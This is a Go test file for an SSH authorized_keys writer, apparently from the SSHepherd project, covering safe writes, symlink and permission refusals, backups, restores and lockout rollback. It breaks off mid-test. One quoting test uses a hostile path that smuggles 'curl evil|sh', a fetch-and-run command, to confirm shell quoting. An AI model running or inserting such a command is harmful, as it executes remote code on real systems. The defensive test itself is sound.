package sshwrite

import (
	"bytes"
	"context"
	"errors"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/javadh75/SSHepherd/internal/audit"
	"github.com/javadh75/SSHepherd/internal/authkeys"
	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/keyfile"
	"github.com/javadh75/SSHepherd/internal/sshconn"
	"github.com/javadh75/SSHepherd/internal/sshconn/sshtest"
)

const managed = authkeys.ManagedHeader + "\nkey-line\n"

func TestCksumMatchesPOSIXCksum(t *testing.T) {
	// Fixed vectors pin the algorithm even where no cksum binary exists.
	vectors := []struct {
		in   string
		want uint32
	}{
		{"", 4294967295},
		{"abc", 1219131554},
	}
	for _, v := range vectors {
		if got := Cksum([]byte(v.in)); got != v.want {
			t.Errorf("Cksum(%q) = %d, want %d", v.in, got, v.want)
		}
	}
	bin, err := exec.LookPath("cksum")
	if err != nil {
		t.Skip("no cksum binary to cross-check against")
	}
	inputs := [][]byte{[]byte(managed), bytes.Repeat([]byte("ssh-ed25519 AAAA x\n"), 4000), {0, 1, 2, 255}}
	for _, in := range inputs {
		c := exec.CommandContext(t.Context(), bin)
		c.Stdin = bytes.NewReader(in)
		out, err := c.Output()
		if err != nil {
			t.Fatalf("cksum: %v", err)
		}
		f := strings.Fields(string(out))
		snap := SnapshotOf(false, in)
		if len(f) < 2 || f[0] != strconv.FormatUint(uint64(snap.Cksum), 10) || f[1] != strconv.Itoa(snap.Size) {
			t.Errorf("cksum binary says %q, Go says %d %d", out, snap.Cksum, snap.Size)
		}
	}
}

func TestScriptsAreSingleLineAndQuotePathOnce(t *testing.T) {
	const hostile = "/etc/o'brien/keys; curl evil|sh"
	for name, script := range map[string]string{
		"write absent":   writeCmdFor(hostile, Snapshot{Absent: true}, 10),
		"write present":  writeCmdFor(hostile, SnapshotOf(false, []byte("x\n")), 10),
		"restore":        restoreCmdFor(hostile, false, SnapshotOf(false, []byte("x\n"))),
		"restore absent": restoreCmdFor(hostile, true, SnapshotOf(false, []byte("x\n"))),
	} {
		if strings.ContainsAny(script, "\n\r") {
			t.Errorf("%s: script must be single-line (sshconn.Exec rejects newlines)", name)
		}
		if n := strings.Count(script, sshconn.ShQuote(hostile)); n != 1 {
			t.Errorf("%s: path appears %d times quoted, want exactly once", name, n)
		}
		if !strings.HasPrefix(script, sshconn.PathAssign(hostile)+"; ") {
			t.Errorf("%s: script must start with the PathAssign prologue", name)
		}
	}
}

// shells lists the POSIX shells available to run the scripts under: sh
// always, plus dash, bash and busybox ash when installed — the scripts must
// behave identically under each (the fleet runs all of them as /bin/sh).
func shells(t *testing.T) [][]string {
	t.Helper()
	out := [][]string{{"sh"}}
	for _, s := range [][]string{{"dash"}, {"bash", "--posix"}, {"busybox", "sh"}} {
		if _, err := exec.LookPath(s[0]); err == nil {
			out = append(out, s)
		}
	}
	return out
}

// runSh executes a builder's script through a real shell with HOME pinned to
// a sandbox dir, feeding stdin, and returns the exit code — the same
// through-a-real-shell discipline as sshconn's TestDefaultCmdBehavesLikeOldConst.
func runSh(t *testing.T, shell []string, script, home string, stdin []byte) int {
	t.Helper()
	return runShEnv(t, shell, script, home, stdin)
}

// runShEnv is runSh with extra environment entries (e.g. a PATH override
// that stubs a command).
func runShEnv(t *testing.T, shell []string, script, home string, stdin []byte, env ...string) int {
	t.Helper()
	argv := append(append([]string{}, shell[1:]...), "-c", script)
	c := exec.CommandContext(t.Context(), shell[0], argv...) // #nosec G204 -- test runs the package's own scripts
	c.Env = append(append(os.Environ(), "HOME="+home), env...)
	if stdin != nil {
		c.Stdin = bytes.NewReader(stdin)
	}
	var stderr bytes.Buffer
	c.Stderr = &stderr
	err := c.Run()
	if err == nil {
		return 0
	}
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		return exitErr.ExitCode()
	}
	t.Fatalf("%v -c %q: %v (stderr %q)", shell, script, err, stderr.String())
	return -1
}

// forEachShell runs fn as a subtest per available shell.
func forEachShell(t *testing.T, fn func(t *testing.T, sh []string)) {
	t.Helper()
	for _, sh := range shells(t) {
		t.Run(strings.Join(sh, "_"), func(t *testing.T) { fn(t, sh) })
	}
}

func readFile(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read %s: %v", path, err)
	}
	return string(b)
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func assertAbsent(t *testing.T, path, why string) {
	t.Helper()
	if _, err := os.Lstat(path); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("%s exists: %s", filepath.Base(path), why)
	}
}

// assertNoResidue checks the protocol's scratch names are gone.
func assertNoResidue(t *testing.T, target string) {
	t.Helper()
	assertAbsent(t, target+tmpSuffix, "temp residue left behind")
	assertAbsent(t, target+lockSuffix, "lock directory left behind")
}

func ptr(s string) *string { return &s }

func TestWriteCmdThroughRealSh(t *testing.T) {
	forEachShell(t, func(t *testing.T, sh []string) {
		t.Run("creates file and parent dir with owner-only modes", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "newdir", "auth")
			if code := runSh(t, sh, writeCmdFor("~/newdir/auth", Snapshot{Absent: true}, len(managed)), home, []byte(managed)); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			if got := readFile(t, target); got != managed {
				t.Fatalf("file = %q, want the stdin content", got)
			}
			if fi, _ := os.Stat(target); fi.Mode().Perm() != 0o600 {
				t.Errorf("file mode = %o, want 600 (umask 077 before any byte lands)", fi.Mode().Perm())
			}
			if fi, _ := os.Stat(filepath.Dir(target)); fi.Mode().Perm() != 0o700 {
				t.Errorf("dir mode = %o, want 700", fi.Mode().Perm())
			}
			assertAbsent(t, target+bakSuffix, "nothing to back up on first contact")
			assertAbsent(t, target+origSuffix, "nothing to preserve on first contact")
			assertNoResidue(t, target)
		})

		t.Run("backs up: .bak rolls per apply, .orig is sticky", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			const hand = "hand-maintained\n"
			writeFile(t, target, hand)
			if code := runSh(t, sh, writeCmdFor(target, SnapshotOf(false, []byte(hand)), len(managed)), home, []byte(managed)); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			if got := readFile(t, target); got != managed {
				t.Errorf("file = %q, want new content", got)
			}
			if got := readFile(t, target+bakSuffix); got != hand {
				t.Errorf(".bak = %q, want the replaced bytes", got)
			}
			if got := readFile(t, target+origSuffix); got != hand {
				t.Errorf(".orig = %q, want the pre-SSHepherd original", got)
			}
			assertNoResidue(t, target)

			// A second apply over managed content: .bak rolls, .orig stays.
			v2 := managed + "second-key\n"
			if code := runSh(t, sh, writeCmdFor(target, SnapshotOf(false, []byte(managed)), len(v2)), home, []byte(v2)); code != 0 {
				t.Fatalf("second exit = %d, want 0", code)
			}
			if got := readFile(t, target+bakSuffix); got != managed {
				t.Errorf(".bak after rerun = %q, want the previous (managed) version", got)
			}
			if got := readFile(t, target+origSuffix); got != hand {
				t.Errorf(".orig after rerun = %q, want it untouched (sticky)", got)
			}
		})

		t.Run("managed file never creates .orig", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, managed)
			if code := runSh(t, sh, writeCmdFor(target, SnapshotOf(false, []byte(managed)), len(managed)), home, []byte(managed)); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			assertAbsent(t, target+origSuffix, "an already-managed file is not an original")
		})

		t.Run("short stdin leaves the original untouched", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, "original\n")
			// The script expects the full render; the stream delivers half.
			short := []byte(managed[:len(managed)/2])
			if code := runSh(t, sh, writeCmdFor(target, SnapshotOf(false, []byte("original\n")), len(managed)), home, short); code != shortWriteExit {
				t.Fatalf("exit = %d, want the %d short-write sentinel", code, shortWriteExit)
			}
			if got := readFile(t, target); got != "original\n" {
				t.Errorf("file = %q, a truncated upload must never be installed", got)
			}
			assertNoResidue(t, target)
		})

		t.Run("compare-and-swap mismatch refuses", func(t *testing.T) {
			tests := []struct {
				name    string
				current *string // nil: absent
				expect  Snapshot
			}{
				{"content changed", ptr("changed\n"), SnapshotOf(false, []byte("planned\n"))},
				{"same length, different bytes", ptr("abcd\n"), SnapshotOf(false, []byte("abce\n"))},
				{"appeared since plan", ptr("new\n"), Snapshot{Absent: true}},
				{"vanished since plan", nil, SnapshotOf(false, []byte("planned\n"))},
			}
			for _, tt := range tests {
				t.Run(tt.name, func(t *testing.T) {
					home := t.TempDir()
					target := filepath.Join(home, "auth")
					if tt.current != nil {
						writeFile(t, target, *tt.current)
					}
					if code := runSh(t, sh, writeCmdFor(target, tt.expect, len(managed)), home, []byte(managed)); code != changedExit {
						t.Fatalf("exit = %d, want the %d changed sentinel", code, changedExit)
					}
					if tt.current != nil {
						if got := readFile(t, target); got != *tt.current {
							t.Errorf("file = %q, want it untouched", got)
						}
					} else {
						assertAbsent(t, target, "a refused write must not create the file")
					}
					assertAbsent(t, target+bakSuffix, "a refused write takes no backup")
					assertNoResidue(t, target)
				})
			}
		})

		t.Run("held lock refuses and is left alone", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, "v1\n")
			if err := os.Mkdir(target+lockSuffix, 0o700); err != nil {
				t.Fatal(err)
			}
			if code := runSh(t, sh, writeCmdFor(target, SnapshotOf(false, []byte("v1\n")), len(managed)), home, []byte(managed)); code != lockedExit {
				t.Fatalf("exit = %d, want the %d locked sentinel", code, lockedExit)
			}
			if got := readFile(t, target); got != "v1\n" {
				t.Errorf("file = %q, want it untouched", got)
			}
			if fi, err := os.Stat(target + lockSuffix); err != nil || !fi.IsDir() {
				t.Error("another apply's lock must not be removed")
			}
		})

		t.Run("symlinked target exits 45 and takes no backup", func(t *testing.T) {
			home := t.TempDir()
			realTarget := filepath.Join(home, "real")
			link := filepath.Join(home, "auth")
			writeFile(t, realTarget, "k\n")
			if err := os.Symlink(realTarget, link); err != nil {
				t.Fatal(err)
			}
			if code := runSh(t, sh, writeCmdFor(link, SnapshotOf(false, []byte("k\n")), len(managed)), home, []byte(managed)); code != symlinkExit {
				t.Fatalf("exit = %d, want the 45 symlink sentinel", code)
			}
			if fi, err := os.Lstat(link); err != nil || fi.Mode()&os.ModeSymlink == 0 {
				t.Error("symlink was disturbed")
			}
			assertAbsent(t, link+bakSuffix, "refused write must not create a backup")
		})

		t.Run("symlinked parent directory refuses", func(t *testing.T) {
			home := t.TempDir()
			victim := filepath.Join(home, "victim")
			if err := os.Mkdir(victim, 0o700); err != nil {
				t.Fatal(err)
			}
			writeFile(t, filepath.Join(victim, "auth"), "victim\n")
			if err := os.Symlink(victim, filepath.Join(home, "dot-ssh")); err != nil {
				t.Fatal(err)
			}
			target := filepath.Join(home, "dot-ssh", "auth")
			if code := runSh(t, sh, writeCmdFor(target, SnapshotOf(false, []byte("victim\n")), len(managed)), home, []byte(managed)); code != unsafePathExit {
				t.Fatalf("exit = %d, want the %d unsafe-path sentinel", code, unsafePathExit)
			}
			if got := readFile(t, filepath.Join(victim, "auth")); got != "victim\n" {
				t.Errorf("victim = %q, a write through a symlinked directory must not happen", got)
			}
		})

		t.Run("group/other-writable ancestor refuses", func(t *testing.T) {
			// Like sshd's StrictModes walk: anyone who can write an ancestor
			// can swap the path under the write.
			home := t.TempDir()
			sub := filepath.Join(home, "sub")
			if err := os.Mkdir(sub, 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.Chmod(sub, 0o777); err != nil { // #nosec G302 -- the unsafe ancestor under test
				t.Fatal(err)
			}
			target := filepath.Join(sub, "dot-ssh", "auth")
			if code := runSh(t, sh, writeCmdFor(target, Snapshot{Absent: true}, len(managed)), home, []byte(managed)); code != unsafePathExit {
				t.Fatalf("exit = %d, want the %d unsafe-path sentinel", code, unsafePathExit)
			}
			assertAbsent(t, target, "nothing may be written under a writable ancestor")
		})

		t.Run("ancestor symlink into a writable directory refuses", func(t *testing.T) {
			// The logical ancestors are fine (the link is ours), but the
			// directory it resolves to is world-writable: the physical
			// path is walked too.
			home := t.TempDir()
			ww := filepath.Join(home, "ww")
			if err := os.Mkdir(ww, 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.Chmod(ww, 0o777); err != nil { // #nosec G302 -- the unsafe ancestor under test
				t.Fatal(err)
			}
			if err := os.Symlink(ww, filepath.Join(home, "sub")); err != nil {
				t.Fatal(err)
			}
			target := filepath.Join(home, "sub", "dot-ssh", "auth")
			if code := runSh(t, sh, writeCmdFor(target, Snapshot{Absent: true}, len(managed)), home, []byte(managed)); code != unsafePathExit {
				t.Fatalf("exit = %d, want the %d unsafe-path sentinel", code, unsafePathExit)
			}
			assertAbsent(t, filepath.Join(ww, "dot-ssh", "auth"), "nothing may be written under a writable ancestor")
		})

		t.Run("ancestor symlink to a safe directory is followed", func(t *testing.T) {
			home := t.TempDir()
			realDir := filepath.Join(home, "real")
			if err := os.Mkdir(realDir, 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(realDir, filepath.Join(home, "sub")); err != nil {
				t.Fatal(err)
			}
			target := filepath.Join(home, "sub", "dot-ssh", "auth")
			if code := runSh(t, sh, writeCmdFor(target, Snapshot{Absent: true}, len(managed)), home, []byte(managed)); code != 0 {
				t.Fatalf("exit = %d, want 0 (a link the login user owns, into a safe directory)", code)
			}
			if got := readFile(t, filepath.Join(realDir, "dot-ssh", "auth")); got != managed {
				t.Errorf("file = %q, want the render", got)
			}
		})

		t.Run("planted backup symlinks are never written through", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			victim := filepath.Join(home, "victim")
			writeFile(t, target, "hand\n")
			writeFile(t, victim, "victim\n")
			for _, s := range []string{bakSuffix, origSuffix} {
				if err := os.Symlink(victim, target+s); err != nil {
					t.Fatal(err)
				}
			}
			if code := runSh(t, sh, writeCmdFor(target, SnapshotOf(false, []byte("hand\n")), len(managed)), home, []byte(managed)); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			if got := readFile(t, victim); got != "victim\n" {
				t.Errorf("victim = %q, the backup must not follow a planted symlink", got)
			}
			if fi, err := os.Lstat(target + bakSuffix); err != nil || !fi.Mode().IsRegular() || readFile(t, target+bakSuffix) != "hand\n" {
				t.Error(".bak must be replaced by a fresh regular file holding the previous bytes")
			}
			if fi, err := os.Lstat(target + origSuffix); err != nil || fi.Mode()&os.ModeSymlink == 0 {
				t.Error("a planted .orig symlink is skipped (left alone), never written through")
			}
		})

		t.Run("hostile path with single quote", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "o'brien keys")
			if code := runSh(t, sh, writeCmdFor(target, Snapshot{Absent: true}, len(managed)), home, []byte(managed)); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			if got := readFile(t, target); got != managed {
				t.Fatalf("file = %q, want content at the literal path", got)
			}
		})
	})
}

func TestRestoreCmdThroughRealSh(t *testing.T) {
	forEachShell(t, func(t *testing.T, sh []string) {
		t.Run("puts the previous version back", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, managed)
			writeFile(t, target+bakSuffix, "previous\n")
			if code := runSh(t, sh, restoreCmdFor(target, false, SnapshotOf(false, []byte(managed))), home, nil); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			if got := readFile(t, target); got != "previous\n" {
				t.Errorf("file = %q, want the backup restored", got)
			}
			assertNoResidue(t, target)
		})
		t.Run("first-contact write is removed", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, managed)
			if code := runSh(t, sh, restoreCmdFor(target, true, SnapshotOf(false, []byte(managed))), home, nil); code != 0 {
				t.Fatalf("exit = %d, want 0", code)
			}
			assertAbsent(t, target, "the file this apply created must be removed")
		})
		t.Run("file changed since this apply wrote it refuses", func(t *testing.T) {
			// The write's lock ended with stage 1; a concurrent apply that
			// wrote in between must not have its result replaced by .bak.
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, "another apply's result\n")
			writeFile(t, target+bakSuffix, "previous\n")
			if code := runSh(t, sh, restoreCmdFor(target, false, SnapshotOf(false, []byte(managed))), home, nil); code != changedExit {
				t.Fatalf("exit = %d, want %d", code, changedExit)
			}
			if got := readFile(t, target); got != "another apply's result\n" {
				t.Errorf("file = %q, want the concurrent result left alone", got)
			}
			if got := readFile(t, target+bakSuffix); got != "previous\n" {
				t.Errorf("backup = %q, want it kept", got)
			}
			assertNoResidue(t, target)
		})
		t.Run("first-contact file changed since written refuses", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, "another apply's result\n")
			if code := runSh(t, sh, restoreCmdFor(target, true, SnapshotOf(false, []byte(managed))), home, nil); code != changedExit {
				t.Fatalf("exit = %d, want %d", code, changedExit)
			}
			if got := readFile(t, target); got != "another apply's result\n" {
				t.Errorf("file = %q, want it left alone", got)
			}
		})
		t.Run("lock released between failed mkdir and the check leaves no stale lock", func(t *testing.T) {
			// Stub mkdir: the first attempt on the lock fails as if another
			// apply held it, and that holder is gone by the next call.
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, managed)
			writeFile(t, target+bakSuffix, "previous\n")
			stub := t.TempDir()
			mkdirBin, err := exec.LookPath("mkdir")
			if err != nil {
				t.Fatal(err)
			}
			writeFile(t, filepath.Join(stub, "mkdir"), "#!/bin/sh\ncase \"$1\" in *"+lockSuffix+") if [ ! -e \""+stub+"/raced\" ]; then : > \""+stub+"/raced\"; exit 1; fi;; esac\nexec "+mkdirBin+" \"$@\"\n")
			if err := os.Chmod(filepath.Join(stub, "mkdir"), 0o700); err != nil { // #nosec G302 -- test stub must be executable
				t.Fatal(err)
			}
			code := runShEnv(t, sh, restoreCmdFor(target, false, SnapshotOf(false, []byte(managed))), home, nil, "PATH="+stub+":"+os.Getenv("PATH"))
			if _, err := os.Stat(filepath.Join(stub, "raced")); os.IsNotExist(err) {
				// busybox-static (FEATURE_SH_STANDALONE / PREFER_APPLETS, as on
				// GitHub's ubuntu runners) runs mkdir as its built-in applet and
				// never consults PATH, so a stub cannot simulate the race here.
				// dash, bash and PATH-honoring busybox builds still cover it.
				t.Skipf("%v runs mkdir as a built-in applet; a PATH stub cannot simulate the lost race", sh)
			}
			if code != lockedExit {
				t.Fatalf("exit = %d, want %d (a lost race, safe to retry)", code, lockedExit)
			}
			assertNoResidue(t, target)
			if got := readFile(t, target); got != managed {
				t.Errorf("file = %q, want it untouched", got)
			}
		})
		t.Run("held lock refuses", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			writeFile(t, target, managed)
			writeFile(t, target+bakSuffix, "previous\n")
			if err := os.Mkdir(target+lockSuffix, 0o700); err != nil {
				t.Fatal(err)
			}
			if code := runSh(t, sh, restoreCmdFor(target, false, SnapshotOf(false, []byte(managed))), home, nil); code != lockedExit {
				t.Fatalf("exit = %d, want %d", code, lockedExit)
			}
		})
	})
}

// scriptedExec fakes sshconn.Exec: it records each command and returns the
// scripted response for the call ordinal.
type scriptedExec struct {
	cmds      []string
	responses []execResp
}

type execResp struct {
	code   int
	stdout string
	stderr string
	err    error
}

func (s *scriptedExec) exec(_ context.Context, _ *ssh.Client, cmd string, stdin io.Reader) (int, *sshconn.CappedBuffer, *sshconn.CappedBuffer, error) {
	i := len(s.cmds)
	s.cmds = append(s.cmds, cmd)
	if stdin != nil {
		// Drain like a real session would; content correctness is asserted
		// via the verify stage's scripted stdout.
		_, _ = io.Copy(io.Discard, stdin)
	}
	r := execResp{}
	switch {
	case i < len(s.responses):
		r = s.responses[i]
	case cmd == probeCmd:
		// Unscripted probes answer like a healthy login: tests script a
		// probe response only when they exercise its failure.
		r = execResp{stdout: probeOutput}
	}
	if r.err != nil {
		return 0, nil, nil, r.err
	}
	out := sshconn.NewCappedBuffer(sshconn.MaxRemoteOutput)
	_, _ = out.Write([]byte(r.stdout))
	errBuf := sshconn.NewCappedBuffer(sshconn.MaxRemoteOutput)
	_, _ = errBuf.Write([]byte(r.stderr))
	return r.code, out, errBuf, nil
}

// seamedConnect records every connect's options; probeErr fails the
// post-write probe (the connect with Only set).
type seamedConnect struct {
	opts     []sshconn.ConnectOptions
	probeErr error
}

func (c *seamedConnect) connect(_ context.Context, _ config.Server, opts sshconn.ConnectOptions) (*sshconn.Conn, error) {
	c.opts = append(c.opts, opts)
	if len(opts.Only) > 0 && c.probeErr != nil {
		return nil, c.probeErr
	}
	return &sshconn.Conn{}, nil // Close is nil-safe by design
}

// seamedWriter builds a FleetWriter whose network is fully scripted.
func seamedWriter(s *scriptedExec, c *seamedConnect) *FleetWriter {
	return &FleetWriter{connect: c.connect, exec: s.exec}
}

func req(content string, survivors ...string) Request {
	if len(survivors) == 0 {
		survivors = []string{"SHA256:survivor"}
	}
	return Request{Content: []byte(content), Expect: SnapshotOf(false, []byte("old\n")), Survivors: survivors}
}

func TestApplyProtocolHappyPath(t *testing.T) {
	content := "rendered\n"
	s := &scriptedExec{responses: []execResp{
		{code: 0},                  // guarded write
		{code: 0, stdout: content}, // verify read-back
	}}
	c := &seamedConnect{}
	srv := config.Server{Name: "w1", Host: "h", Port: 22, User: "u"}
	r := req(content, "SHA256:a", "SHA256:b")
	if err := seamedWriter(s, c).Apply(context.Background(), srv, r); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if len(s.cmds) != 3 {
		t.Fatalf("ran %d commands, want 3 (write, verify, probe)", len(s.cmds))
	}
	if s.cmds[2] != probeCmd {
		t.Errorf("cmd[2] = %q, want the probe command run over the probe login", s.cmds[2])
	}
	if s.cmds[0] != writeCmdFor("~/.ssh/authorized_keys", r.Expect, len(content)) {
		t.Errorf("cmd[0] = %q, want the default-path guarded write", s.cmds[0])
	}
	if s.cmds[1] != sshconn.AuthorizedKeysCmdFor("~/.ssh/authorized_keys") {
		t.Errorf("cmd[1] = %q, want the existing read command as verify", s.cmds[1])
	}
	if len(c.opts) != 2 || len(c.opts[0].Only) != 0 || strings.Join(c.opts[1].Only, ",") != "SHA256:a,SHA256:b" {
		t.Errorf("connects = %+v, want the write connection then a probe offering only the survivors", c.opts)
	}
}

func TestApplyHonorsAuthorizedKeysFileOverride(t *testing.T) {
	s := &scriptedExec{responses: []execResp{{code: 0}, {code: 0, stdout: "x\n"}}}
	srv := config.Server{Name: "w1", Host: "h", Port: 22, User: "u", AuthorizedKeysFile: "/etc/keys/u"}
	r := req("x\n")
	if err := seamedWriter(s, &seamedConnect{}).Apply(context.Background(), srv, r); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	for i, want := range []string{writeCmdFor("/etc/keys/u", r.Expect, 2), sshconn.AuthorizedKeysCmdFor("/etc/keys/u")} {
		if s.cmds[i] != want {
			t.Errorf("cmd[%d] = %q, want override path command %q", i, s.cmds[i], want)
		}
	}
}

func TestApplySentinelRefusals(t *testing.T) {
	tests := []struct {
		code    int
		target  any
		refusal bool
		wantIn  string
	}{
		{symlinkExit, new(*SymlinkError), true, "is a symlink"},
		{changedExit, new(*ChangedError), true, "changed since the plan"},
		{lockedExit, new(*LockedError), true, "another apply is in progress"},
		{unsafePathExit, new(*UnsafePathError), true, "not owned by the login user"},
		{shortWriteExit, nil, false, "upload incomplete"},
	}
	for _, tt := range tests {
		t.Run(tt.wantIn, func(t *testing.T) {
			s := &scriptedExec{responses: []execResp{{code: tt.code}}}
			c := &seamedConnect{}
			err := seamedWriter(s, c).Apply(context.Background(), config.Server{Name: "w"}, req("x\n"))
			if err == nil || !strings.Contains(err.Error(), tt.wantIn) {
				t.Fatalf("err = %v, want it to mention %q", err, tt.wantIn)
			}
			if tt.target != nil && !errors.As(err, tt.target) {
				t.Errorf("err = %T, want %T", err, tt.target)
			}
			if IsRefusal(err) != tt.refusal {
				t.Errorf("IsRefusal = %v, want %v", IsRefusal(err), tt.refusal)
			}
			if len(s.cmds) != 1 || len(c.opts) != 1 {
				t.Errorf("ran %d commands / %d connects, want 1/1 (nothing after a refused write)", len(s.cmds), len(c.opts))
			}
		})
	}
}

func TestApplyStageFailures(t *testing.T) {
	tests := []struct {
		name      string
		responses []execResp
		wantIn    string
		wantCmds  int
	}{
		{"write nonzero", []execResp{{code: 1, stderr: "mv: read-only"}}, "write", 1},
		{"write transport error", []execResp{{err: errors.New("EOF")}}, "installs only a complete upload", 1},
		{"verify transport error", []execResp{{code: 0}, {err: errors.New("channel gone")}}, "verify", 2},
		{"verify absent after write", []execResp{{code: 0}, {code: 44}}, "absent after write", 2},
		{"verify bytes differ", []execResp{{code: 0}, {code: 0, stdout: "tampered\n"}}, "differ", 2},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s := &scriptedExec{responses: tt.responses}
			c := &seamedConnect{}
			err := seamedWriter(s, c).Apply(context.Background(), config.Server{Name: "w"}, req("rendered\n"))
			if err == nil || !strings.Contains(err.Error(), tt.wantIn) {
				t.Fatalf("err = %v, want it to mention %q", err, tt.wantIn)
			}
			if len(s.cmds) != tt.wantCmds {
				t.Errorf("ran %d commands, want %d (later stages must not run after a failure)", len(s.cmds), tt.wantCmds)
			}
			if len(c.opts) != 1 {
				t.Errorf("connects = %d, want 1 (no login probe after a failed write/verify)", len(c.opts))
			}
		})
	}
}

func TestApplyLoginProbeFailureRestores(t *testing.T) {
	probeErr := errors.New("ssh: unable to authenticate")
	for _, tt := range []struct {
		name     string
		absent   bool
		probe    *execResp // non-nil: the probe login succeeds and runs this
		restore  execResp
		wantIn   string
		restored bool
	}{
		{name: "forced command answers the probe", probe: &execResp{stdout: "forced\n"}, restore: execResp{code: 0}, restored: true, wantIn: "lockout prevented"},
		{name: "probe command fails", probe: &execResp{code: 1}, restore: execResp{code: 0}, restored: true, wantIn: "lockout prevented"},
		{name: "probe session refused", probe: &execResp{err: errors.New("session refused")}, restore: execResp{code: 0}, restored: true, wantIn: "lockout prevented"},
		{name: "restores the backup", restore: execResp{code: 0}, restored: true, wantIn: "lockout prevented — restored previous file"},
		{name: "first contact removes the file", absent: true, restore: execResp{code: 0}, restored: true, wantIn: "lockout prevented"},
		{name: "restore failure is loud", restore: execResp{code: 1, stderr: "mv: denied"}, wantIn: "AND restoring the previous file failed"},
		{name: "restore refused: file changed since written", restore: execResp{code: changedExit}, wantIn: "changed since this apply wrote it"},
		{name: "restore refused: locked", restore: execResp{code: lockedExit}, wantIn: "another apply holds the lock"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			responses := []execResp{{code: 0}, {code: 0, stdout: "x\n"}}
			c := &seamedConnect{probeErr: probeErr}
			wantProbe := "unable to authenticate"
			if tt.probe != nil {
				responses = append(responses, *tt.probe)
				c.probeErr = nil
				wantProbe = "probe"
			}
			s := &scriptedExec{responses: append(responses, tt.restore)}
			r := req("x\n")
			if tt.absent {
				r.Expect = Snapshot{Absent: true}
			}
			err := seamedWriter(s, c).Apply(context.Background(), config.Server{Name: "w"}, r)
			var lo *LockoutError
			if !errors.As(err, &lo) {
				t.Fatalf("err = %v, want *LockoutError", err)
			}
			if !strings.Contains(err.Error(), tt.wantIn) || !strings.Contains(err.Error(), wantProbe) {
				t.Errorf("err = %q, want %q and the probe failure", err, tt.wantIn)
			}
			if (lo.Restore == nil) != tt.restored {
				t.Errorf("Restore = %v, want restored=%v", lo.Restore, tt.restored)
			}
			if n := len(responses) + 1; len(s.cmds) != n || s.cmds[n-1] != restoreCmdFor(sshconn.DefaultAuthorizedKeysPath, tt.absent, SnapshotOf(false, r.Content)) {
				t.Errorf("cmds = %q, want write, verify, then the restore", s.cmds)
			}
			if IsRefusal(err) {
				t.Error("a rolled-back lockout is a failure, not a refusal")
			}
		})
	}
}

func TestApplyRequiresSurvivors(t *testing.T) {
	s := &scriptedExec{}
	c := &seamedConnect{}
	r := req("x\n")
	r.Survivors = nil
	err := seamedWriter(s, c).Apply(context.Background(), config.Server{Name: "w"}, r)
	if err == nil || !strings.Contains(err.Error(), "no surviving key you hold") {
		t.Fatalf("err = %v, want the no-survivor refusal", err)
	}
	if len(c.opts) != 0 {
		t.Error("must not connect without a key to prove the login with")
	}
}

func TestApplyInterruptedBeforeWrite(t *testing.T) {
	t.Run("canceled before connect", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		cancel()
		s := &scriptedExec{}
		c := &seamedConnect{}
		err := seamedWriter(s, c).Apply(ctx, config.Server{Name: "w"}, req("x\n"))
		if !errors.Is(err, ErrNotStarted) {
			t.Fatalf("err = %v, want ErrNotStarted", err)
		}
		if len(c.opts)+len(s.cmds) != 0 {
			t.Error("nothing may run once ctx is canceled")
		}
	})
	t.Run("canceled during connect", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		s := &scriptedExec{}
		w := &FleetWriter{exec: s.exec, connect: func(cctx context.Context, _ config.Server, _ sshconn.ConnectOptions) (*sshconn.Conn, error) {
			cancel()
			<-cctx.Done() // the AfterFunc forwards the cancel into the dial
			return nil, cctx.Err()
		}}
		err := w.Apply(ctx, config.Server{Name: "w"}, req("x\n"))
		if !errors.Is(err, ErrNotStarted) {
			t.Fatalf("err = %v, want ErrNotStarted", err)
		}
		if len(s.cmds) != 0 {
			t.Error("the write must not start after an interrupted connect")
		}
	})
	t.Run("started write ignores a later cancel", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		var sawCanceled bool
		s := &scriptedExec{responses: []execResp{{code: 0}, {code: 0, stdout: "x\n"}}}
